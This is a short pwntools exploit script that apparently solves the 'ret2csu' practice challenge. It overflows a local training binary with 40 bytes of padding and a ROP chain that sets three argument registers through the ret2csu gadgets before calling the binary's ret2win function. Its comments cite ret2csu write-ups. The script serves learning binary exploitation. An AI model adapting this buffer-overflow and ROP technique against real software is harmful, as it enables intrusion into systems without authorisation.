from pwn import *

binary = context.binary = ELF("./ret2csu", checksec=False)
p = process()
context.log_level="debug"
# gdbscript = "b *0x40062a"
# pid = gdb.attach(p, gdbscript=gdbscript)

arguments = [
	p64(0xdeadbeefdeadbeef),
	p64(0xcafebabecafebabe),
	p64(0xd00df00dd00df00d)]

# gadgets = {
# 	"mov_gadgets": p64(0x400680),  # mov rdx,r15; mov rsi,r14; mov edi,r13d; call QWORD PTR [r12+rbx*8]
# 	"pop_gadgets": p64(0x40069a),  # pop rbx & rbp, r12 through r15; ret
# }

padding = b"\x90"*40
#ret2win = p64(0x40062a)

rop = ROP(binary)
rop.ret2csu(edi=0x1337, rsi=arguments[1], rdx=arguments[2])
rop(rdi=arguments[0])
rop.call(binary.plt.ret2win)

p.sendlineafter(b"> ", padding+rop.chain())
print(p.recvall())

""" 
:ret2csu Sources
 - https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf
 - https://ir0nstone.gitbook.io/notes/types/stack/ret2csu
 - https://gist.github.com/kaftejiman/a853ccb659fc3633aa1e61a9e26266e9
"""